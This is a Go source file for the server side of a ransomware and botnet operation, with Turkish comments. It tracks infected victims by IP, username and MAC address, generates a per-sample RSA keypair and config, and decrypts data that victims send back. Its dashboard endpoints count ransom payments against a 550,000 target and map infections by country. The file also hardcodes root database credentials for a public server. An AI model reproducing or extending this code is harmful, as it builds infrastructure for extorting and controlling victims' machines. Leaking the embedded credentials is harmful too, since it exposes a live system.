package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"database/sql"
	b64 "encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"gopkg.in/matryer/respond.v1"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"reflect"
	"strconv"
	"text/template"
)

func debugger(debugLine string){
	fmt.Println(debugLine)
}

type Malware struct {
	Id            int
	MalwareTypeId int
	Situation     string
}
func check(e error) {
	if e != nil {
		panic(e)
	}
}
type Victim struct{
	Id int
	VictimIp string
	Victim_local_ip string
	Computer_name string
	Username string
	Computer_ram float32
	Computer_cpu string
	Computer_status int
	Botnet_status int
	MacAddress string

}

func moveToVar( mid string)  {
	fmt.Println("move to var")
	var out bytes.Buffer
	cmd := exec.Command("cp", "/home/live/keys/"+mid+"/"+mid+"_rsa_public_key.pub","/var/www/html/keys/")
	cmd.Stdout = &out
	_ = cmd.Run()
	fmt.Printf("translated phrase: %q\n", out.String())
	//if err := cmd.Run(); err != nil {
	//	log.Fatal(err)
	//}
}
func moveToLive( id string)  {
	fmt.Println("move to live")
	keyPath := "/home/live/keys/"+id
	var out bytes.Buffer
	fmt.Println("keyPath : " + keyPath)
	cmd1 := exec.Command("mkdir", keyPath)
	cmd1.Stdout = &out
	_ = cmd1.Run()
	fmt.Printf("translated phrase: %q\n", out.String())

	//if err := cmd1.Run(); err != nil {
	//	log.Fatal(err)
	//}

	cmd2 := exec.Command("mv", "*_rsa_*","/home/live/keys/"+id+"/")
	_ = cmd2.Run()
	//if err := cmd2.Run(); err != nil {
	//	log.Fatal(err)
	//}
}
func GenerateRSA(id int) {
	fmt.Println("generate rsa")
	// generate key
	privatekey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		fmt.Printf("Cannot generate RSA key\n")
		os.Exit(1)
	}
	publickey := &privatekey.PublicKey

	// dump private key to file
	var privateKeyBytes []byte = x509.MarshalPKCS1PrivateKey(privatekey)
	privateKeyBlock := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: privateKeyBytes,
	}
	privatePem, err := os.Create(strconv.Itoa(id)+"_rsa_private_key")
	if err != nil {
		fmt.Printf("error when create private.pem: %s \n", err)
		os.Exit(1)
	}
	err = pem.Encode(privatePem, privateKeyBlock)
	if err != nil {
		fmt.Printf("error when encode private pem: %s \n", err)
		os.Exit(1)
	}

	// dump public key to file
	publicKeyBytes, err := x509.MarshalPKIXPublicKey(publickey)
	if err != nil {
		fmt.Printf("error when dumping publickey: %s \n", err)
		os.Exit(1)
	}
	publicKeyBlock := &pem.Block{
		Type:  "RSA PUBLIC KEY",
		Bytes: publicKeyBytes,
	}
	publicPem, err := os.Create(strconv.Itoa(id)+"_rsa_public_key.pub")
	if err != nil {
		fmt.Printf("error when create public.pem: %s \n", err)
		os.Exit(1)
	}
	err = pem.Encode(publicPem, publicKeyBlock)
	if err != nil {
		fmt.Printf("error when encode public pem: %s \n", err)
		os.Exit(1)
	}
}

var tmpl = template.Must(template.ParseGlob("form/*"))
func dbConn() (db *sql.DB) {
	dbDriver := "mysql"
	dbUser := "root"
	dbPass := "MB_bpt2a{P5<77Mr?)"
	dbName := "tester"
	whoWherePort:=dbUser+":"+dbPass+"@tcp(138.68.86.190:3306)/"+dbName

	//db, err := sql.Open(dbDriver, dbUser+":"+dbPass+"@/"+dbName)
	db, err := sql.Open(dbDriver, whoWherePort)

	if err != nil {
		panic(err.Error())
	}
	return db
}
func IndexVictim(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Victim ORDER BY id DESC")
	if err != nil {
		panic(err.Error())
	}
	emp := Victim{}
	res := []Victim{}
	for selDB.Next() {
		var id int
		var victimIp string
		var victimLocalIp string
		var computerName string
		var username string
		var computerRam float32
		var computerCpu string
		var computerStatus int
		var botnetStatus int
		var mac string
		err = selDB.Scan(&id, &victimIp, &victimLocalIp ,&computerName,&username,&computerRam,&computerCpu,&computerStatus,&botnetStatus,&mac)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = id
		emp.VictimIp = victimIp
		emp.Victim_local_ip = victimLocalIp
		emp.Computer_name = victimLocalIp
		emp.Username = victimLocalIp
		emp.Computer_ram = computerRam
		emp.Computer_cpu = computerCpu
		emp.Computer_status = computerStatus
		emp.Botnet_status = botnetStatus
		emp.MacAddress = mac
		res = append(res, emp)
	}
	_ = tmpl.ExecuteTemplate(w, "IndexVictim", res)
	defer db.Close()
}
func IndexMalware(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Malware ORDER BY id DESC")

	if err != nil {
		panic(err.Error())
	}
	emp := Malware{}
	res := []Malware{}
	for selDB.Next() {
		var Id int
		var MalwareTypeId int
		var Situation string
		err = selDB.Scan(&Id, &MalwareTypeId, &Situation)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = Id
		emp.MalwareTypeId = MalwareTypeId
		emp.Situation = Situation
		res = append(res, emp)
	}
	fmt.Println(res)
	w.Header().Set("Content-Type","application/json")
	_ = tmpl.ExecuteTemplate(w, "IndexMalwares", res)
	defer db.Close()
}
func ShowMalware(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	nId := r.URL.Query().Get("id")
	selDB, err := db.Query("SELECT * FROM Malware WHERE id=?", nId)
	if err != nil {
		panic(err.Error())
	}
	emp := Malware{}
	for selDB.Next() {
		var id ,malwareTypeId int
		var situation string
		err = selDB.Scan(&id, &malwareTypeId, &situation)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = id
		emp.MalwareTypeId = malwareTypeId
		emp.Situation = situation
	}
	tmpl.ExecuteTemplate(w, "ShowMalware", emp)
	defer db.Close()
}
func NewVictim(w http.ResponseWriter, r *http.Request) {
	tmpl.ExecuteTemplate(w, "NewVictim", nil)
}
func InsertVictim(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	if r.Method == "POST" {
		id  := r.FormValue("id")
		victimIp  := r.FormValue("victimIp")
		victimLocalIp  := r.FormValue("victimLocalIp")
		computer_name  := r.FormValue("computer_name")
		username  := r.FormValue("username")
		computer_ram  := r.FormValue("computer_ram")
		computer_cpu  := r.FormValue("computer_cpu")
		computer_status  := r.FormValue("computer_status")
		botnet_status  := r.FormValue("botnet_status")
		mac  := r.FormValue("mac-address")

		fmt.Println(id, victimIp,victimLocalIp,computer_name,username,computer_ram,computer_cpu,computer_status,botnet_status )
		insForm, err := db.Prepare("INSERT INTO Victim(id, victim_ip,victim_local_ip,computer_name,username,computer_ram,computer_cpu,computer_status,botnet_status ) VALUES(?,?,?,?,?,?,?,?,?)")
		if err != nil {
			panic(err.Error())
		}

		//victim için bi platform eklemesi yapılmış olması lazım onu kontrol edip execute etmek lazım
		//TODO

		insForm.Exec(id, victimIp, victimLocalIp, computer_name, username, computer_ram, computer_cpu, computer_status, botnet_status, mac)
	}
	defer db.Close()
	http.Redirect(w, r, "/Victims", 301)
}

func getJSON(sqlString string) (string, error) {
	db := dbConn()
	rows, err := db.Query(sqlString)
	if err != nil {
		return "", err
	}
	defer rows.Close()
	columns, err := rows.Columns()
	if err != nil {
		return "", err
	}
	count := len(columns)
	tableData := make([]map[string]interface{}, 0)
	values := make([]interface{}, count)
	valuePtrs := make([]interface{}, count)
	for rows.Next() {
		for i := 0; i < count; i++ {
			valuePtrs[i] = &values[i]
		}
		_ = rows.Scan(valuePtrs...)
		entry := make(map[string]interface{})
		for i, col := range columns {
			var v interface{}
			val := values[i]
			b, ok := val.([]byte)
			if ok {
				v = string(b)
			} else {
				v = val
			}
			entry[col] = v
		}
		tableData = append(tableData, entry)
	}
	jsonData, err := json.Marshal(tableData)
	if err != nil {
		return "", err
	}
	fmt.Println(string(jsonData))
	defer db.Close()
	return string(jsonData), nil
}
func getRequested(sqlReq string,w http.ResponseWriter){
	jsonized ,_ := getJSON(sqlReq)
	fmt.Println(jsonized)
	_ = json.NewEncoder(w).Encode(jsonized)
}
func CreateConfig(id int){
	fmt.Println("createConfig")
	idString := strconv.Itoa(id)
	sEncId := b64.StdEncoding.EncodeToString([]byte(idString))
	fmt.Println(sEncId)
	err := ioutil.WriteFile(idString+"_config", []byte(sEncId), 0644)
	fmt.Println("after file write")
	cmd1 := exec.Command("mv", idString+"_config"+" /var/www/configs/")
	fmt.Println("after exec")
	_ = cmd1.Run()
	fmt.Println("run afteri")

	//if err := cmd1.Run(); err != nil {
	//	fmt.Println("fatal yedik")
	//	log.Fatal(err)
	//}
	check(err)
}

func GetID(w http.ResponseWriter, r *http.Request) {
	debugger("get id method")
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Malware ORDER BY id DESC LIMIT 1")
	if err != nil {
		panic(err.Error())
	}
	for selDB.Next() {
		var Id int
		var MalwareTypeId int
		var Situation string
		err = selDB.Scan(&Id, &MalwareTypeId, &Situation)
		if err != nil {
			panic(err.Error())
		}
		var idString = strconv.Itoa(Id+1)
		var idString2 = strconv.Itoa(Id+1)
		CreateConfig(Id+1)
		GenerateRSA(Id+1)
		moveToLive(idString)
		moveToVar(idString2)
		debugger(strconv.Itoa(Id+1))
		respond.With(w, r, http.StatusOK, Id+1)
	}

	defer db.Close()
}


type CountryCount struct {
	CC string
	Count string
}

func GetCountryOld(w http.ResponseWriter, r *http.Request){
	jsonized ,_ := getJSON("SELECT country_code,COUNT(*) as count FROM IPWhois GROUP BY country_code ORDER BY count DESC ")
	fmt.Println(jsonized)
	fmt.Println(reflect.TypeOf(jsonized))

	db := dbConn()
	selDB, err := db.Query("SELECT country_code,COUNT(*) as count FROM IPWhois GROUP BY country_code")
	if err != nil {
		panic(err.Error())
	}
	var jsonResp string
	jsonResp = "{"
	notFirst := false
	i := 1
	cTemp := CountryCount{}
	cArr := []CountryCount{}
	for selDB.Next(){
		var count string
		var cc string
		if notFirst {
			jsonResp = jsonResp + ","
		}
		err = selDB.Scan(&cc,&count)
		cTemp.Count = count
		cTemp.CC = cc
		cArr = append(cArr, cTemp)
		if err != nil {
			panic(err.Error())
		}
		notFirst=true
	}
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Content-Type", "application/json")
	jsonResp = jsonResp + "}"
	j2, _ := json.Marshal(cArr)
	w.Write(j2)
	//respond.With(w, r, http.StatusOK,(j2) )
	i = i+1
	defer db.Close()
}

func GetCountry(w http.ResponseWriter, r *http.Request){
	log.Println("GetCountry hit!!")
	db := dbConn()
	selDB, err := db.Query("SELECT country_code,COUNT(*) as count FROM IPWhois GROUP BY country_code")
	if err != nil {
		panic(err.Error())
	}
	jsonMap := map[string]int{}
	for selDB.Next(){
		var count int
		var cc string
		err = selDB.Scan(&cc,&count)
		jsonMap[cc]=count
	}
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Content-Type", "application/json")
	respond.With(w, r, http.StatusOK,(jsonMap) )
	defer db.Close()
}
func GetMoney(w http.ResponseWriter, r *http.Request){
	jsonized ,_ := getJSON("SELECT amount,COUNT(*) as count FROM Money GROUP BY amount ORDER BY count DESC ")
	respond.With(w, r, http.StatusOK,jsonized)
}

func TypeCounter(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT attack_vector_type,COUNT(*) as count FROM AttackVector GROUP BY attack_vector_type ORDER BY count DESC")
	if err != nil {
		panic(err.Error())
	}
	mapper:= map[string]int{}
	for selDB.Next(){
		var vector string
		var count int
		err = selDB.Scan(&vector,&count)
		mapper[vector]=count
	}
	respond.With(w, r, http.StatusOK,mapper)
	defer db.Close()
}
func GetVictims(w http.ResponseWriter, r *http.Request){
	db := dbConn()
	selDB, err := db.Query("SELECT vi.id, vi.victim_ip, vi.username, ms.infected_date,ms.first_touch_with_cc,c.name FROM Victim vi,MalwareStatus ms, Country c, IPWhois ipw WHERE vi.id = ms.id AND vi.victim_ip=ipw.ip AND ipw.country_code = c.code ")
	if err != nil {
		panic(err.Error())
	}
	MapOfThemAll := map[int]map[string]string{}
	i := 0
	for selDB.Next(){
		jsonMap := map[string]string{}
		var Id string
		var ip string
		var uname string
		var idate string
		var tdate string
		var country string
		err = selDB.Scan(&Id,&ip,&uname,&idate,&tdate,&country)
		jsonMap["id"]=Id
		jsonMap["ip"]=ip
		jsonMap["username"]=uname
		jsonMap["infection_date"]=idate
		jsonMap["first_touch"]=tdate
		jsonMap["country"]=country
		MapOfThemAll[i]=jsonMap
		i++
	}
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Content-Type", "application/json")
	respond.With(w, r, http.StatusOK,(MapOfThemAll) )
	defer db.Close()

}
func CreatedInfectedInfo(w http.ResponseWriter, r *http.Request){
	//created-> malware sayısı
	//infected -> victim sayısı
	debugger("created infected")
	db := dbConn()
	selDB, err := db.Query("SELECT COUNT(*) FROM Malware")
	if err != nil {
		panic(err.Error())
	}
	var created int
	for selDB.Next(){
		err = selDB.Scan(&created)
		if err != nil {
			panic(err.Error())
		}
	}
	var infected int
	selDB, err = db.Query("SELECT COUNT(*) FROM Victim")
	if err != nil {
		panic(err.Error())
	}
	for selDB.Next(){
		err = selDB.Scan(&infected)
		if err != nil {
			panic(err.Error())
		}
	}
	mapper := map[string]int{}
	mapper["created"]=created
	mapper["infected"]=infected

	respond.With(w, r, http.StatusOK, mapper)
	defer db.Close()

}
func GetBotnet(w http.ResponseWriter, r *http.Request){
	log.Println("GetBotnet hit!!")
	db := dbConn()
	selDB, err := db.Query("SELECT COUNT(bt.victim_id)as count , c.code FROM Victim vi, Country c, IPWhois ipw,Botnet bt WHERE bt.victim_id = vi.id AND vi.victim_ip=ipw.ip AND ipw.country_code = c.code GROUP BY bt.victim_id ORDER BY count")
	if err != nil {
		panic(err.Error())
	}
	jsonMap := map[string]int{}
	for selDB.Next(){
		var count int
		var cc string
		err = selDB.Scan(&count,&cc)
		jsonMap[cc]=count
	}
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Content-Type", "application/json")
	respond.With(w, r, http.StatusOK, jsonMap)
	defer db.Close()
}
func MoneyCounter(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Money")
	if err != nil {
		panic(err.Error())
	}
	odeyen := 0
	odemeyen := 0
	toplanan :=0
	for selDB.Next() {
		var amount int
		var status int
		var malid int
		err = selDB.Scan(&malid, &amount, &status)
		if err != nil {
			panic(err.Error())
		}
		if status == 0 {
			odemeyen++
		}
		if status == 0 {
			odeyen++
		}
		toplanan += amount
	}
	mapper:=map[string]int{}
	mapper["paid"] = odeyen
	mapper["notpaid"] = odemeyen
	mapper["collected"] = toplanan
	mapper["target"] = 550000
	respond.With(w, r, http.StatusOK, mapper)
	defer db.Close()
}

func ReadInfoFromRSA(vicId string, infocuk string) []byte {

	// Read the private key
	pemData, err := ioutil.ReadFile("/home/live/keys/"+vicId+"/"+vicId+"_rsa_private_key")
	if err != nil {
		log.Fatalf("read key file: %s", err)
	}

	// Extract the PEM-encoded data block
	block, _ := pem.Decode(pemData)
	if block == nil {
		log.Fatalf("bad key data: %s", "not PEM-encoded")
	}
	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
		log.Fatalf("unknown key type %q, want %q", got, want)
	}

	// Decode the RSA private key
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		log.Fatalf("bad private key: %s", err)
	}

	var out []byte

	// Decrypt the data
	out, err = rsa.DecryptOAEP(sha1.New(), rand.Reader, priv, []byte(infocuk), []byte(""))
	if err != nil {
		log.Fatalf("decrypt: %s", err)
	}
	return out
}

func FirstTouch(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		id := r.FormValue("id")
		info := r.FormValue("info")
		postInfo := ReadInfoFromRSA(id,info)
		fmt.Println("Info: " + string(postInfo))
		//postInfo bir json

		//money-malwareStatus-Victim-IPWhois tabloları güncellenecek

		ip := r.Header.Get("X-FORWARDED-FOR")
		if ip != "" {ip = r.RemoteAddr}
		fmt.Println(ip)

	}
}

func RSADeneme(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		mapper := map[string]string{}
		err := json.NewDecoder(r.Body).Decode(&mapper)
		if err != nil {panic (err)}
		fmt.Println(mapper)
		id2,_ :=strconv.Atoi(mapper["id"])
		GenerateRSA(id2)
		//postInfo := ReadInfoFromRSADeneme(id,info)
		//fmt.Println(postInfo)
		//postInfo bir json

		ip := r.Header.Get("X-FORWARDED-FOR")
		if ip != "" {ip = r.RemoteAddr}
		fmt.Println(ip)

	}
}
func ReadInfoFromRSADeneme(vicId string, infocuk string) []byte {

	// Read the private key
	pemData, err := ioutil.ReadFile("./"+vicId+"_rsa_private_key")
	if err != nil {
		log.Fatalf("read key file: %s", err)
	}

	// Extract the PEM-encoded data block
	block, _ := pem.Decode(pemData)
	if block == nil {
		log.Fatalf("bad key data: %s", "not PEM-encoded")
	}
	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
		log.Fatalf("unknown key type %q, want %q", got, want)
	}

	// Decode the RSA private key
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		log.Fatalf("bad private key: %s", err)
	}

	var out []byte

	// Decrypt the data
	out, err = rsa.DecryptOAEP(sha1.New(), rand.Reader, priv, []byte(infocuk), []byte(""))
	if err != nil {
		log.Fatalf("decrypt: %s", err)
	}
	return out
}

func GetVictimInfo(w http.ResponseWriter , r *http.Request){
	var body string
	var data map[string]interface{}
	err := json.NewDecoder(r.Body).Decode(body)
	check(err)
	json.Unmarshal([]byte(body),&data)
	//fmt.Println(reflect.TypeOf(data))
	//fmt.Println(data)
	//consider the data is fine
	vicId := fmt.Sprintf("%v",data["id"])
	rsaString := fmt.Sprintf("%v",data["info"])
	var encryptedData  = ReadInfoFromRSA(vicId,rsaString)
	fmt.Println(encryptedData)
	// victim info elimizde var şimdi database'e basmak kaldı TODO

}

func main() {
	log.Println("Server started on: http://localhost:8080")
	http.HandleFunc("/Malwares", IndexMalware)
	http.HandleFunc("/Victims", IndexVictim)
	http.HandleFunc("/getMalware", ShowMalware)
	http.HandleFunc("/insertVictim", InsertVictim)
	http.HandleFunc("/getid",GetID)
	http.HandleFunc("/mangirlar", GetMoney)
	http.HandleFunc("/bolivar", GetCountry)
	http.HandleFunc("/dashboard/status/worldmap-ransomware", GetCountry)
	http.HandleFunc("/dashboard/status/getallvictims", GetVictims)
	http.HandleFunc("/dashboard/status/createinfect", CreatedInfectedInfo)
	http.HandleFunc("/dashboard/status/paid", MoneyCounter)
	http.HandleFunc("/dashboard/status/typescount", TypeCounter)
	http.HandleFunc("/dashboard/status/worldmap-botnet", GetBotnet)

	//not done zone TODO ZONE
	http.HandleFunc("/api/user/firsttouch", FirstTouch)
	http.HandleFunc("/api/user/firsttouchdeneme", RSADeneme)

	http.HandleFunc("/new", NewVictim)

	http.ListenAndServe(":8080", nil)
}







